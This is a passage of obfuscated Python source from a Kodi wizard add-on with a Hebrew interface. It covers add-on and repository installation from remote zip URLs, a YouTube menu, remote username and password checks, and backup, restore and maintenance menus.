					if O00O0OO0O0OOOO0O0 <1 :#line:2491
						addFile ("No addons added to this menu yet!",'',themeit =THEME2 )#line:2492
			else :#line:2493
				addFile ('Text File not formated correctly!','',themeit =THEME3 )#line:2494
				wiz .log ("[Addon Menu] ERROR: Invalid Format.")#line:2495
		else :#line:2496
			wiz .log ("[Addon Menu] ERROR: URL for Addon list not working.")#line:2497
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2498
			addFile ('%s'%O00OO0O000OO0O0O0 ,'',themeit =THEME3 )#line:2499
	else :wiz .log ("[Addon Menu] No Addon list added.")#line:2500
	setView ('files','viewType')#line:2501
def addonInstaller (O00O0OOOO00000OOO ,O00000OO000OO00O0 ):#line:2503
	if not ADDONFILE =='http://':#line:2504
		OOOOOO000OOOO0OOO =wiz .workingURL (O00000OO000OO00O0 )#line:2505
		if OOOOOO000OOOO0OOO ==True :#line:2506
			OO0O0OOOO0O00O0O0 =wiz .openURL (O00000OO000OO00O0 ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('repository=""','repository="none"').replace ('repositoryurl=""','repositoryurl="http://"').replace ('repositoryxml=""','repositoryxml="http://"')#line:2507
			O0O00O00000000OO0 =re .compile ('name="(.+?)".+?lugin="%s".+?rl="(.+?)".+?epository="(.+?)".+?epositoryxml="(.+?)".+?epositoryurl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"'%O00O0OOOO00000OOO ).findall (OO0O0OOOO0O00O0O0 )#line:2508
			if len (O0O00O00000000OO0 )>0 :#line:2509
				for O0O00OOO0OOO000OO ,O00000OO000OO00O0 ,OO0O0OOO00O000O0O ,OO00OOO0OOO0O0OOO ,O0OO0OO0000O0O0OO ,O000O0OOO000000O0 ,OO00OOO0000OO0OO0 ,O0000OO0OOO0OOOOO ,O0000O000O00OO0OO in O0O00O00000000OO0 :#line:2510
					if os .path .exists (os .path .join (ADDONS ,O00O0OOOO00000OOO )):#line:2511
						O0O00OO00OOO000OO =['Launch Addon','Remove Addon']#line:2512
						OO00OOO0OO000OOOO =DIALOG .select ("[COLOR %s]Addon already installed what would you like to do?[/COLOR]"%COLOR2 ,O0O00OO00OOO000OO )#line:2513
						if OO00OOO0OO000OOOO ==0 :#line:2514
							wiz .ebi ('RunAddon(%s)'%O00O0OOOO00000OOO )#line:2515
							xbmc .sleep (1000 )#line:2516
							return True #line:2517
						elif OO00OOO0OO000OOOO ==1 :#line:2518
							wiz .cleanHouse (os .path .join (ADDONS ,O00O0OOOO00000OOO ))#line:2519
							try :wiz .removeFolder (os .path .join (ADDONS ,O00O0OOOO00000OOO ))#line:2520
							except :pass #line:2521
							if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to remove the addon_data for:"%COLOR2 ,"[COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR1 ,O00O0OOOO00000OOO ),yeslabel ="[B][COLOR green]Yes Remove[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):#line:2522
								removeAddonData (O00O0OOOO00000OOO )#line:2523
							wiz .refresh ()#line:2524
							return True #line:2525
						else :#line:2526
							return False #line:2527
					O00O00O00OOO00O0O =os .path .join (ADDONS ,OO0O0OOO00O000O0O )#line:2528
					if not OO0O0OOO00O000O0O .lower ()=='none'and not os .path .exists (O00O00O00OOO00O0O ):#line:2529
						wiz .log ("Repository not installed, installing it")#line:2530
						if DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to install the repository for [COLOR %s]%s[/COLOR]:"%(COLOR2 ,COLOR1 ,O00O0OOOO00000OOO ),"[COLOR %s]%s[/COLOR]?[/COLOR]"%(COLOR1 ,OO0O0OOO00O000O0O ),yeslabel ="[B][COLOR green]Yes Install[/COLOR][/B]",nolabel ="[B][COLOR red]No Skip[/COLOR][/B]"):#line:2531
							OO0O000O0O0O0O00O =wiz .parseDOM (wiz .openURL (OO00OOO0OOO0O0OOO ),'addon',ret ='version',attrs ={'id':OO0O0OOO00O000O0O })#line:2532
							if len (OO0O000O0O0O0O00O )>0 :#line:2533
								O0OOO0O000O0O00OO ='%s%s-%s.zip'%(O0OO0OO0000O0O0OO ,OO0O0OOO00O000O0O ,OO0O000O0O0O0O00O [0 ])#line:2534
								wiz .log (O0OOO0O000O0O00OO )#line:2535
								if KODIV >=17 :wiz .addonDatabase (OO0O0OOO00O000O0O ,1 )#line:2536
								installAddon (OO0O0OOO00O000O0O ,O0OOO0O000O0O00OO )#line:2537
								wiz .ebi ('UpdateAddonRepos()')#line:2538
								wiz .log ("Installing Addon from Kodi")#line:2540
								O0000OO00OO000O00 =installFromKodi (O00O0OOOO00000OOO )#line:2541
								wiz .log ("Install from Kodi: %s"%O0000OO00OO000O00 )#line:2542
								if O0000OO00OO000O00 :#line:2543
									wiz .refresh ()#line:2544
									return True #line:2545
							else :#line:2546
								wiz .log ("[Addon Installer] Repository not installed: Unable to grab url! (%s)"%OO0O0OOO00O000O0O )#line:2547
						else :wiz .log ("[Addon Installer] Repository for %s not installed: %s"%(O00O0OOOO00000OOO ,OO0O0OOO00O000O0O ))#line:2548
					elif OO0O0OOO00O000O0O .lower ()=='none':#line:2549
						wiz .log ("No repository, installing addon")#line:2550
						OOOO00OOOOO0OO0O0 =O00O0OOOO00000OOO #line:2551
						O0OOO0OOOO000000O =O00000OO000OO00O0 #line:2552
						installAddon (O00O0OOOO00000OOO ,O00000OO000OO00O0 )#line:2553
						wiz .refresh ()#line:2554
						return True #line:2555
					else :#line:2556
						wiz .log ("Repository installed, installing addon")#line:2557
						O0000OO00OO000O00 =installFromKodi (O00O0OOOO00000OOO ,False )#line:2558
						if O0000OO00OO000O00 :#line:2559
							wiz .refresh ()#line:2560
							return True #line:2561
					if os .path .exists (os .path .join (ADDONS ,O00O0OOOO00000OOO )):return True #line:2562
					O0000000O00OOO00O =wiz .parseDOM (wiz .openURL (OO00OOO0OOO0O0OOO ),'addon',ret ='version',attrs ={'id':O00O0OOOO00000OOO })#line:2563
					if len (O0000000O00OOO00O )>0 :#line:2564
						O00000OO000OO00O0 ="%s%s-%s.zip"%(O00000OO000OO00O0 ,O00O0OOOO00000OOO ,O0000000O00OOO00O [0 ])#line:2565
						wiz .log (str (O00000OO000OO00O0 ))#line:2566
						if KODIV >=17 :wiz .addonDatabase (O00O0OOOO00000OOO ,1 )#line:2567
						installAddon (O00O0OOOO00000OOO ,O00000OO000OO00O0 )#line:2568
						wiz .refresh ()#line:2569
					else :#line:2570
						wiz .log ("no match");return False #line:2571
			else :wiz .log ("[Addon Installer] Invalid Format")#line:2572
		else :wiz .log ("[Addon Installer] Text File: %s"%OOOOOO000OOOO0OOO )#line:2573
	else :wiz .log ("[Addon Installer] Not Enabled.")#line:2574
def installFromKodi (O00OO0O0O0OO0O00O ,over =True ):#line:2576
	if over ==True :#line:2577
		xbmc .sleep (2000 )#line:2578
	wiz .ebi ('RunPlugin(plugin://%s)'%O00OO0O0O0OO0O00O )#line:2580
	if not wiz .whileWindow ('yesnodialog'):#line:2581
		return False #line:2582
	xbmc .sleep (1000 )#line:2583
	if wiz .whileWindow ('okdialog'):#line:2584
		return False #line:2585
	wiz .whileWindow ('progressdialog')#line:2586
	if os .path .exists (os .path .join (ADDONS ,O00OO0O0O0OO0O00O )):return True #line:2587
	else :return False #line:2588
def installAddon (O0O0000000O0O00O0 ,OO0O0O00O000OO00O ):#line:2590
	if not wiz .workingURL (OO0O0O00O000OO00O )==True :wiz .LogNotify ("[COLOR %s]Addon Installer[/COLOR]"%COLOR1 ,'[COLOR %s]%s:[/COLOR] [COLOR %s]קישור זיפ לא תקין![/COLOR]'%(COLOR1 ,O0O0000000O0O00O0 ,COLOR2 ));return #line:2591
	if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:2592
	DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0O0000000O0O00O0 ),'','[COLOR %s]אנא המתן[/COLOR]'%COLOR2 )#line:2593
	OO0O0O0O0O0OOO0O0 =OO0O0O00O000OO00O .split ('/')#line:2594
	O0000000OO000OOO0 =os .path .join (PACKAGES ,OO0O0O0O0O0OOO0O0 [-1 ])#line:2595
	try :os .remove (O0000000OO000OOO0 )#line:2596
	except :pass #line:2597
	downloader .download (OO0O0O00O000OO00O ,O0000000OO000OOO0 ,DP )#line:2598
	O0OOO000OO0OOO00O ='[COLOR %s][B]Installing:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0O0000000O0O00O0 )#line:2599
	DP .update (0 ,O0OOO000OO0OOO00O ,'','[COLOR %s]אנא המתן[/COLOR]'%COLOR2 )#line:2600
	OOO0OO000OOO0OO0O ,O0O00O0OO00OO0OOO ,O0OO0OO00000OOOOO =extract .all (O0000000OO000OOO0 ,ADDONS ,DP ,title =O0OOO000OO0OOO00O )#line:2601
	DP .update (0 ,O0OOO000OO0OOO00O ,'','[COLOR %s]מתקין תלויות[/COLOR]'%COLOR2 )#line:2602
	installed (O0O0000000O0O00O0 )#line:2603
	installDep (O0O0000000O0O00O0 ,DP )#line:2604
	DP .close ()#line:2605
	wiz .ebi ('UpdateAddonRepos()')#line:2606
	wiz .ebi ('UpdateLocalAddons()')#line:2607
	wiz .refresh ()#line:2608
def installDep (O00000O0OO00OO0O0 ,DP =None ):#line:2610
	O000O00OO00O0O000 =os .path .join (ADDONS ,O00000O0OO00OO0O0 ,'addon.xml')#line:2611
	if os .path .exists (O000O00OO00O0O000 ):#line:2612
		OO0O0000OO000OO00 =open (O000O00OO00O0O000 ,mode ='r');O0O0O0O00O00000O0 =OO0O0000OO000OO00 .read ();OO0O0000OO000OO00 .close ();#line:2613
		O0OOO00000O0OOOOO =wiz .parseDOM (O0O0O0O00O00000O0 ,'import',ret ='addon')#line:2614
		for O000OOO0OOO0O0O00 in O0OOO00000O0OOOOO :#line:2615
			if not 'xbmc.python'in O000OOO0OOO0O0O00 :#line:2616
				if not DP ==None :#line:2617
					DP .update (0 ,'','[COLOR %s]%s[/COLOR]'%(COLOR1 ,O000OOO0OOO0O0O00 ))#line:2618
				wiz .createTemp (O000OOO0OOO0O0O00 )#line:2619
def installed (OO0O0OOO000OO000O ):#line:2646
	OOO00OO0O000O0000 =os .path .join (ADDONS ,OO0O0OOO000OO000O ,'addon.xml')#line:2647
	if os .path .exists (OOO00OO0O000O0000 ):#line:2648
		try :#line:2649
			O0O0OOO0O0O0000O0 =open (OOO00OO0O000O0000 ,mode ='r');OOOO000O0O000OOO0 =O0O0OOO0O0O0000O0 .read ();O0O0OOO0O0O0000O0 .close ()#line:2650
			O00O0O0OOO000O0O0 =wiz .parseDOM (OOOO000O0O000OOO0 ,'addon',ret ='name',attrs ={'id':OO0O0OOO000OO000O })#line:2651
			OOO0OOOO00O00O0O0 =os .path .join (ADDONS ,OO0O0OOO000OO000O ,'icon.png')#line:2652
			wiz .LogNotify ('[COLOR %s]%s[/COLOR]'%(COLOR1 ,O00O0O0OOO000O0O0 [0 ]),'[COLOR %s]מאפשר הרחבות[/COLOR]'%COLOR2 ,'2000',OOO0OOOO00O00O0O0 )#line:2653
		except :pass #line:2654
def youtubeMenu (url =None ):#line:2656
	if not YOUTUBEFILE =='http://':#line:2657
		if url ==None :#line:2658
			OO00O000OO000OOO0 =wiz .workingURL (YOUTUBEFILE )#line:2659
			O0000O0OOO0O0O00O =uservar .YOUTUBEFILE #line:2660
		else :#line:2661
			OO00O000OO000OOO0 =wiz .workingURL (url )#line:2662
			O0000O0OOO0O0O00O =url #line:2663
		if OO00O000OO000OOO0 ==True :#line:2664
			OO00OOOOO0000OO0O =wiz .openURL (O0000O0OOO0O0O00O ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2665
			O00OO0000OOOO0O00 =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?escription="(.+?)"').findall (OO00OOOOO0000OO0O )#line:2666
			if len (O00OO0000OOOO0O00 )>0 :#line:2667
				for OO0000O0O0O00OO0O ,O0O00O0OOO0O000O0 ,url ,OO00OOO0000OOO000 ,O0O0O0O00OO0OO0O0 ,O0000O0000O00O00O in O00OO0000OOOO0O00 :#line:2668
					if O0O00O0OOO0O000O0 .lower ()=="yes":#line:2669
						addDir ("[B]%s[/B]"%OO0000O0O0O00OO0O ,'youtube',url ,description =O0000O0000O00O00O ,icon =OO00OOO0000OOO000 ,fanart =O0O0O0O00OO0OO0O0 ,themeit =THEME3 )#line:2670
					else :#line:2671
						addFile (OO0000O0O0O00OO0O ,'viewVideo',url =url ,description =O0000O0000O00O00O ,icon =OO00OOO0000OOO000 ,fanart =O0O0O0O00OO0OO0O0 ,themeit =THEME2 )#line:2672
			else :wiz .log ("[YouTube Menu] ERROR: Invalid Format.")#line:2673
		else :#line:2674
			wiz .log ("[YouTube Menu] ERROR: URL for YouTube list not working.")#line:2675
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2676
			addFile ('%s'%OO00O000OO000OOO0 ,'',themeit =THEME3 )#line:2677
	else :wiz .log ("[YouTube Menu] No YouTube list added.")#line:2678
	setView ('files','viewType')#line:2679
def STARTP ():#line:2680
	OOOOOO00000OOO0O0 =(ADDON .getSetting ("pass"))#line:2681
	if BUILDNAME =="":#line:2682
	 if not NOTIFY =='true':#line:2683
          OO00000OOOOOO0OOO =wiz .workingURL (NOTIFICATION )#line:2684
	 if not NOTIFY2 =='true':#line:2685
          OO00000OOOOOO0OOO =wiz .workingURL (NOTIFICATION2 )#line:2686
	 if not NOTIFY3 =='true':#line:2687
          OO00000OOOOOO0OOO =wiz .workingURL (NOTIFICATION3 )#line:2688
	OOO0O000OOO0000O0 =OOOOOO00000OOO0O0 #line:2689
	OO00000OOOOOO0OOO =urllib2 .Request (SPEED )#line:2690
	O0OOOO00000O0OO0O =urllib2 .urlopen (OO00000OOOOOO0OOO )#line:2691
	OO0000OOO0O0OO0O0 =O0OOOO00000O0OO0O .readlines ()#line:2693
	O00OOO00OOOOO0O00 =0 #line:2697
	for O0000OOO0O00OOO0O in OO0000OOO0O0OO0O0 :#line:2698
		if O0000OOO0O00OOO0O .split (' ==')[0 ]==OOOOOO00000OOO0O0 or O0000OOO0O00OOO0O .split ()[0 ]==OOOOOO00000OOO0O0 :#line:2699
			O00OOO00OOOOO0O00 =1 #line:2700
			break #line:2701
	if O00OOO00OOOOO0O00 ==0 :#line:2702
					OOOOO0OOOO00O00O0 =DIALOG .yesno ("%s"%ADDONTITLE ,"[COLOR %s]הסיסמה אינה נכונה,"%(COLOR2 ),"הכנס את הסיסמה כעת[/COLOR]",nolabel ='[B][COLOR white]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]אישור[/COLOR][/B]')#line:2703
					if OOOOO0OOOO00O00O0 :#line:2705
						ADDON .openSettings ()#line:2707
						sys .exit ()#line:2709
					else :#line:2710
						sys .exit ()#line:2711
	return 'ok'#line:2715
def STARTP2 ():#line:2716
	O0OOOOOO00O00O0O0 =(ADDON .getSetting ("user"))#line:2717
	O0O000OOOO00O0O0O =(UNAME )#line:2719
	OOOOO0O0O0O0OO0O0 =urllib2 .urlopen (O0O000OOOO00O0O0O )#line:2720
	OO0O00OOO0O0OO000 =OOOOO0O0O0O0OO0O0 .readlines ()#line:2721
	OO00O000O00O0OO0O =0 #line:2722
	for O0O0O000OO000O00O in OO0O00OOO0O0OO000 :#line:2725
		if O0O0O000OO000O00O .split (' ==')[0 ]==O0OOOOOO00O00O0O0 or O0O0O000OO000O00O .split ()[0 ]==O0OOOOOO00O00O0O0 :#line:2726
			OO00O000O00O0OO0O =1 #line:2727
			break #line:2728
	if OO00O000O00O0OO0O ==0 :#line:2729
		OOO00OO0O0O0O0OO0 =DIALOG .yesno ("%s"%ADDONTITLE ,"[COLOR %s]שם המתשמש שהוכנס אינו נכון,"%(COLOR2 ),"הכנס את שם המשתמש כעת[/COLOR]",nolabel ='[B][COLOR white]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]אישור[/COLOR][/B]')#line:2730
		if OOO00OO0O0O0O0OO0 :#line:2732
			ADDON .openSettings ()#line:2734
			sys .exit ()#line:2737
		else :#line:2738
			sys .exit ()#line:2739
	return 'ok'#line:2743
def passandpin ():#line:2744
	addFile ('קבל קוד אימות','getpass',name ,'getpass',themeit =THEME1 )#line:2745
	addFile ('הכנס שם משתמש','setuname',name ,'setuname',themeit =THEME1 )#line:2746
	addFile ('הכנס סיסמה','setpass',name ,'setpass',themeit =THEME1 )#line:2747
def passandUsername ():#line:2748
	ADDON .openSettings ()#line:2749
def folderback ():#line:2752
    OO0000OO0OOO0O0OO =ADDON .getSetting ("path")#line:2753
    if OO0000OO0OOO0O0OO :#line:2754
      OO0000OO0OOO0O0OO =xbmcgui .Dialog ().browse (0 ,"בחר תקייה",'files','',False ,False ,HOME )#line:2755
      ADDON .setSetting ("path",OO0000OO0OOO0O0OO )#line:2756
def backmyupbuild ():#line:2759
		addFile ('מחק את תיקיית הגיבוי שלי','clearbackup',icon =ICONMAINT ,themeit =THEME3 )#line:2763
		addFile ('[COLOR %s]%s[/COLOR]מיקום גיבוי: '%(COLOR2 ,MYBUILDS ),'folderback','Maintenance',icon =ICONMAINT ,themeit =THEME3 )#line:2764
		addFile ('גיבוי בילד שלם','backupbuild',icon =ICONMAINT ,themeit =THEME3 )#line:2765
		addFile ('גיבוי הגדרות סקין ותפריטים בלבד','backuptheme',icon =ICONMAINT ,themeit =THEME3 )#line:2767
		addFile ('גיבוי הגדרות של הרחבות כולל תפריטים וסיסמאות','backupaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2768
		addFile ('שחזור בילד שלם','restorezip',icon =ICONMAINT ,themeit =THEME3 )#line:2769
		addFile ('שחזור הגדרות','restoreaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2771
def maintMenu (view =None ):#line:2775
	OO00OO00O00O0O0O0 ='[B][COLOR green]ON[/COLOR][/B]';O000OO000O0OOO0O0 ='[B][COLOR red]OFF[/COLOR][/B]'#line:2777
	O00OOOOO0OOO00000 ='true'if AUTOCLEANUP =='true'else 'false'#line:2778
	O0OO000OO0OO0O0O0 ='true'if AUTOCACHE =='true'else 'false'#line:2779
	O0OOO000OO0O00O0O ='true'if AUTOPACKAGES =='true'else 'false'#line:2780
	OOOO0OOOOO00O00OO ='true'if AUTOTHUMBS =='true'else 'false'#line:2781
	OO00O0OO0O000OOO0 ='true'if SHOWMAINT =='true'else 'false'#line:2782
	OO0O00O0OOO0O0000 ='true'if INCLUDEVIDEO =='true'else 'false'#line:2783
	O0O00OO0O0OOO0OO0 ='true'if INCLUDEALL =='true'else 'false'#line:2784
	OO00O0O0000OOO0O0 ='true'if THIRDPARTY =='true'else 'false'#line:2785
	if wiz .Grab_Log (True )==False :OOO00O0OO0OO00O0O =0 #line:2786
	else :OOO00O0OO0OO00O0O =errorChecking (wiz .Grab_Log (True ),True ,True )#line:2787
	if wiz .Grab_Log (True ,True )==False :OO0OOOOOOO0O0O0OO =0 #line:2788
	else :OO0OOOOOOO0O0O0OO =errorChecking (wiz .Grab_Log (True ,True ),True ,True )#line:2789
	OOO000O0O0OOO0O0O =int (OOO00O0OO0OO00O0O )+int (OO0OOOOOOO0O0O0OO )#line:2790
	OOO0OO00O000000OO =str (OOO000O0O0OOO0O0O )+' Error(s) Found'if OOO000O0O0OOO0O0O >0 else 'None Found'#line:2791
	OO0OOO0O00O00O0OO =': [COLOR red]Not Found[/COLOR]'if not os .path .exists (WIZLOG )else ": [COLOR green]%s[/COLOR]"%wiz .convertSize (os .path .getsize (WIZLOG ))#line:2792
	if O0O00OO0O0OOO0OO0 =='true':#line:2793
		OOOO0O00OO00OO00O ='true'#line:2794
		O0OOO000OOOO0OO00 ='true'#line:2795
		OO00OOO000OOOO0O0 ='true'#line:2796
		O0OOOO0000O00OO00 ='true'#line:2797
		OO0O0O0000O0O0OOO ='true'#line:2798
		O0OO0OO00O0O000OO ='true'#line:2799
		OOOO0O00OOO0OOO00 ='true'#line:2800
		O0OOOO00OO0O00O00 ='true'#line:2801
	else :#line:2802
		OOOO0O00OO00OO00O ='true'if INCLUDEBOB =='true'else 'false'#line:2803
		O0OOO000OOOO0OO00 ='true'if INCLUDEPHOENIX =='true'else 'false'#line:2804
		OO00OOO000OOOO0O0 ='true'if INCLUDESPECTO =='true'else 'false'#line:2805
		O0OOOO0000O00OO00 ='true'if INCLUDEGENESIS =='true'else 'false'#line:2806
		OO0O0O0000O0O0OOO ='true'if INCLUDEEXODUS =='true'else 'false'#line:2807
		O0OO0OO00O0O000OO ='true'if INCLUDEONECHAN =='true'else 'false'#line:2808
		OOOO0O00OOO0OOO00 ='true'if INCLUDESALTS =='true'else 'false'#line:2809
		O0OOOO00OO0O00O00 ='true'if INCLUDESALTSHD =='true'else 'false'#line:2810
	OO0OOOO000OO00O00 =wiz .getSize (PACKAGES )#line:2811
	OOOO0OOO00OO00OOO =wiz .getSize (THUMBS )#line:2812
	OO0OO00OO0O00O000 =wiz .getCacheSize ()#line:2813
	O0000OOO0OO0O0OO0 =OO0OOOO000OO00O00 +OOOO0OOO00OO00OOO +OO0OO00OO0O00O000 #line:2814
	O0O00000OO00000O0 =['Daily','Always','3 Days','Weekly']#line:2815
	addDir ('[B]Cleaning Tools[/B]','maint','clean',icon =ICONMAINT ,themeit =THEME1 )#line:2816
	if view =="clean"or SHOWMAINT =='true':#line:2817
		addFile ('ניקוי מלא: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (O0000OOO0OO0O0OO0 ),'fullclean',icon =ICONMAINT ,themeit =THEME3 )#line:2818
		addFile ('ניקוי קאש: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (OO0OO00OO0O00O000 ),'clearcache',icon =ICONMAINT ,themeit =THEME3 )#line:2819
		addFile ('ניקוי חבילות: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (OO0OOOO000OO00O00 ),'clearpackages',icon =ICONMAINT ,themeit =THEME3 )#line:2820
		addFile ('ניקוי תמונות: [COLOR green][B]%s[/B][/COLOR]'%wiz .convertSize (OOOO0OOO00OO00OOO ),'clearthumb',icon =ICONMAINT ,themeit =THEME3 )#line:2821
		addFile ('ניקוי תמונות ישנות','oldThumbs',icon =ICONMAINT ,themeit =THEME3 )#line:2822
		addFile ('ניקוי קאש לוג','clearcrash',icon =ICONMAINT ,themeit =THEME3 )#line:2823
		addFile ('ניקוי חבילות ישנות','purgedb',icon =ICONMAINT ,themeit =THEME3 )#line:2824
		addFile ('התקנה נקיה','freshstart',icon =ICONMAINT ,themeit =THEME3 )#line:2825
	addDir ('[B]Addon Tools[/B]','maint','addon',icon =ICONMAINT ,themeit =THEME1 )#line:2826
	if view =="addon"or SHOWMAINT =='false':#line:2827
		addFile ('הסרת הרחבות','removeaddons',icon =ICONMAINT ,themeit =THEME3 )#line:2828
		addDir ('הסרת מידע הרחבות','removeaddondata',icon =ICONMAINT ,themeit =THEME3 )#line:2829
		addDir ('הפעלה או ביטול הרחבות','enableaddons',icon =ICONMAINT ,themeit =THEME3 )#line:2830
		addFile ('Enable/Disable Adult Addons','toggleadult',icon =ICONMAINT ,themeit =THEME3 )#line:2831
		addFile ('בודק עדכונים','forceupdate',icon =ICONMAINT ,themeit =THEME3 )#line:2832
		addFile ('Hide Passwords On Keyboard Entry','hidepassword',icon =ICONMAINT ,themeit =THEME3 )#line:2833
		addFile ('Unhide Passwords On Keyboard Entry','unhidepassword',icon =ICONMAINT ,themeit =THEME3 )#line:2834
	addDir ('[B]Misc Maintenance[/B]','maint','misc',icon =ICONMAINT ,themeit =THEME1 )#line:2835
	if view =="misc"or SHOWMAINT =='true':#line:2836
		addFile ('Kodi 17 Fix','kodi17fix',icon =ICONMAINT ,themeit =THEME3 )#line:2837
		addFile ('Reload Skin','forceskin',icon =ICONMAINT ,themeit =THEME3 )#line:2838
		addFile ('Reload Profile','forceprofile',icon =ICONMAINT ,themeit =THEME3 )#line:2839
		addFile ('Force Close Kodi','forceclose',icon =ICONMAINT ,themeit =THEME3 )#line:2840
		addFile ('Upload Kodi.log','uploadlog',icon =ICONMAINT ,themeit =THEME3 )#line:2841
		addFile ('View Errors in Log: %s'%(OOO0OO00O000000OO ),'viewerrorlog',icon =ICONMAINT ,themeit =THEME3 )#line:2842
		addFile ('View Log File','viewlog',icon =ICONMAINT ,themeit =THEME3 )#line:2843
		addFile ('View Wizard Log File','viewwizlog',icon =ICONMAINT ,themeit =THEME3 )#line:2844
		addFile ('Clear Wizard Log File%s'%OO0OOO0O00O00O0OO ,'clearwizlog',icon =ICONMAINT ,themeit =THEME3 )#line:2845
	addDir ('[B]שחזור וגיבוי[/B]','maint','backup',icon =ICONMAINT ,themeit =THEME1 )#line:2846
	if view =="backup"or SHOWMAINT =='true':#line:2847
		addFile ('Clean Up Back Up Folder','clearbackup',icon =ICONMAINT ,themeit =THEME3 )#line:2848
		addFile ('Back Up Location: [COLOR %s]%s[/COLOR]'%(COLOR2 ,MYBUILDS ),'settings','Maintenance',icon =ICONMAINT ,themeit =THEME3 )#line:2849
		addFile ('[גיבוי]: בילד','backupbuild',icon =ICONMAINT ,themeit =THEME3 )#line:2850
		addFile ('[גיבוי]: פרופילים','backupgui',icon =ICONMAINT ,themeit =THEME3 )#line:2851
		addFile ('[גיבוי]: סקינים','backuptheme',icon =ICONMAINT ,themeit =THEME3 )#line:2852
		addFile ('[גיבוי]: אדון דאטה','backupaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2853
		addFile ('[שחזור]: בילד מתיקיה מקומית','restorezip',icon =ICONMAINT ,themeit =THEME3 )#line:2854
		addFile ('[שחזור]: פרופילים מתיקיה מקומית','restoregui',icon =ICONMAINT ,themeit =THEME3 )#line:2855
		addFile ('[שחזור]: אדון דאטה מתיקיה מקומית','restoreaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2856
		addFile ('[שחזור]: בילד מתיקיה חיצונית','restoreextzip',icon =ICONMAINT ,themeit =THEME3 )#line:2857
		addFile ('[שחזור]: פרופילים מתיקיה חיצונית','restoreextgui',icon =ICONMAINT ,themeit =THEME3 )#line:2858
		addFile ('[שחזור]: אדון דאטה מתיקיה חיצונית','restoreextaddon',icon =ICONMAINT ,themeit =THEME3 )#line:2859
	addDir ('[B]System Tweaks/Fixes[/B]','maint','tweaks',icon =ICONMAINT ,themeit =THEME1 )#line:2860
	if view =="tweaks"or SHOWMAINT =='true':#line:2861
		if not ADVANCEDFILE =='http://'and not ADVANCEDFILE =='':#line:2862
			addDir ('Advanced Settings','advancedsetting',icon =ICONMAINT ,themeit =THEME3 )#line:2863
		else :#line:2864
			if os .path .exists (ADVANCED ):#line:2865
				addFile ('View Currect AdvancedSettings.xml','currentsettings',icon =ICONMAINT ,themeit =THEME3 )#line:2866
				addFile ('Remove Currect AdvancedSettings.xml','removeadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2867
			addFile ('Quick Configure AdvancedSettings.xml','autoadvanced',icon =ICONMAINT ,themeit =THEME3 )#line:2868
		addFile ('Scan Sources for broken links','checksources',icon =ICONMAINT ,themeit =THEME3 )#line:2869
		addFile ('Scan For Broken Repositories','checkrepos',icon =ICONMAINT ,themeit =THEME3 )#line:2870
		addFile ('Fix Addons Not Updating','fixaddonupdate',icon =ICONMAINT ,themeit =THEME3 )#line:2871
		addFile ('Remove Non-Ascii filenames','asciicheck',icon =ICONMAINT ,themeit =THEME3 )#line:2872
		addFile ('Convert Paths to special','convertpath',icon =ICONMAINT ,themeit =THEME3 )#line:2873
		addDir ('System Information','systeminfo',icon =ICONMAINT ,themeit =THEME3 )#line:2874
	addFile ('Show All Maintenance: %s'%OO00O0OO0O000OOO0 .replace ('true',OO00OO00O00O0O0O0 ).replace ('false',O000OO000O0OOO0O0 ),'togglesetting','showmaint',icon =ICONMAINT ,themeit =THEME2 )#line:2875
	addDir ('[I]<< Return to Main Menu[/I]',icon =ICONMAINT ,themeit =THEME2 )#line:2876
	addFile ('Third Party Wizards: %s'%OO00O0O0000OOO0O0 .replace ('true',OO00OO00O00O0O0O0 ).replace ('false',O000OO000O0OOO0O0 ),'togglesetting','enable3rd',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2877
	if OO00O0O0000OOO0O0 =='true':#line:2878
		O000OO000OOOO0O0O =THIRD1NAME if not THIRD1NAME ==''else 'Not Set'#line:2879
		OOO0O0O000OOOOO0O =THIRD2NAME if not THIRD2NAME ==''else 'Not Set'#line:2880
		O0O0O00OOO000O000 =THIRD3NAME if not THIRD3NAME ==''else 'Not Set'#line:2881
		addFile ('Edit Third Party Wizard 1: [COLOR %s]%s[/COLOR]'%(COLOR2 ,O000OO000OOOO0O0O ),'editthird','1',icon =ICONMAINT ,themeit =THEME3 )#line:2882
		addFile ('Edit Third Party Wizard 2: [COLOR %s]%s[/COLOR]'%(COLOR2 ,OOO0O0O000OOOOO0O ),'editthird','2',icon =ICONMAINT ,themeit =THEME3 )#line:2883
		addFile ('Edit Third Party Wizard 3: [COLOR %s]%s[/COLOR]'%(COLOR2 ,O0O0O00OOO000O000 ),'editthird','3',icon =ICONMAINT ,themeit =THEME3 )#line:2884
	addFile ('ניקוי אוטומטי','',fanart =FANART ,icon =ICONMAINT ,themeit =THEME1 )#line:2885
	addFile ('ניקוי אוטומטי בהפעלה: %s'%O00OOOOO0OOO00000 .replace ('true',OO00OO00O00O0O0O0 ).replace ('false',O000OO000O0OOO0O0 ),'togglesetting','autoclean',icon =ICONMAINT ,themeit =THEME3 )#line:2886
	if O00OOOOO0OOO00000 =='true':#line:2887
